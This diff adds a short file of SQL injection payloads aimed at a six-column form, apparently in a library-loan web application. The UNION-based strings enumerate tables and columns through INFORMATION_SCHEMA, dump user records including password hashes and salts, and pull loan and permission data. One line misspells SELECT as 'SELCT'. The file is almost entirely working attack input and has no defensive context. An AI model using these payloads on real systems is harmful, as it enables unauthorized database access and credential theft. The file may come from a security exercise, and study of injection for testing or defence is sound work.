@@ -1,0 +1,27 @@
+
+--General Query 
+
+SELECT ? FROM ? WHERE ? = user_input;
+
+--Table Test
+' UNION SELECT 1, 2, 3, 4, 5, 6 FROM dual -- 
+
+-- Get Table Names 
+' UNION SELECT TABLE_NAME, TABLE_SCHEMA, 3, 4, 5, 6 FROM INFORMATION_SCHEMA.TABLES -- 
+
+-- Get Column Names
+' UNION SELCT COLUMN_NAME, 2, 3, 4, 5, 6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users' -- 
+
+--Get All Users
+' UNION SELECT user_id, username, email, pass, salt, role_type_name FROM user -- 
+
+--Get ALL Loans with usernames
+
+' UNION SELECT loan_id, book_title, username, withdraw_date, return_by_date, is_returned 
+FROM loan l, user u, title t 
+WHERE u.user_id = l.user_id AND t.title_id = l.title_id -- 
+
+--Get Permission - My form requires a query that returns six columns
+
+' UNION SELECT role_type, permission, 3, 4, 5, 6
+FROM permissions -- 
